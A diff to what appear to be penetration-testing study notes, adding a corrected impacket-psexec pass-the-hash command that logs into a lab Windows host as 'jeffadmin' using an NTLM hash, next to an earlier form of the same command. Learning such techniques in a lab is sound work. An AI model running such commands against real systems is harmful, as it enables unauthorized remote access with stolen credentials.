@@ -468,6 +468,10 @@ On Kali:
 ```
 impacket-psexec 192.168.248.72 /user:jeffadmin /ntlm:e460605a9dbd55097c6cf77af2f89a03
 ```
+Best:
+```
+impacket-psexec -hashes 00000000000000000000000000000000:e460605a9dbd55097c6cf77af2f89a03 jeffadmin@192.168.248.72
+```
 
 ## Pass the Hash
 
